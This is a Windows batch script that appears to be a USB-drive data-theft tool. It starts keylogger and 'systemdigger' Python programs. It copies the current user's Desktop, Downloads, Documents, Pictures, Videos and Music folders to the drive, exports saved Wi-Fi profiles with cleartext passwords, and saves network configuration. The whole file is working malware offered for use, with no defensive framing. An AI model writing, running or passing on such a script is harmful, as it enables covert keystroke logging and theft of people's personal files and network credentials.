@echo off

@REm start programes
start "" "H:\keylogger\keylogger.pyw"
start "" "H:\keylogger\systemdigger.pyw"

@REM make directories
MKDIR "H:\keylogger\data"
MKDIR "H:\keylogger\data\%username%"
MKDIR "H:\keylogger\data\%username%\Desktop"
MKDIR "H:\keylogger\data\%username%\Downloads"
MKDIR "H:\keylogger\data\%username%\Pictures"
MKDIR "H:\keylogger\data\%username%\Videos"
MKDIR "H:\keylogger\data\%username%\Music"

@REM copy files to pendrive
XCOPY "C:\Users\%username%\Desktop" "H:\keylogger\data\%username%\Desktop"
XCOPY "C:\Users\%username%\Downloads" "H:\keylogger\data\%username%\Downloads"
XCOPY "C:\Users\%username%\Pictures" "H:\keylogger\data\%username%\Pictures"
XCOPY "C:\Users\%username%\Documents" "H:\keylogger\data\%username%\Documents"
XCOPY "C:\Users\%username%\Videos" "H:\keylogger\data\%username%\Videos"
XCOPY "C:\Users\%username%\Music" "H:\keylogger\data\%username%\Music"

@REM wifi passwords
netsh wlan export profile key=clear

@REM ipaddress
ipconfig > ipconfig.txt 


@REM systeminfo > systeminfo.txt
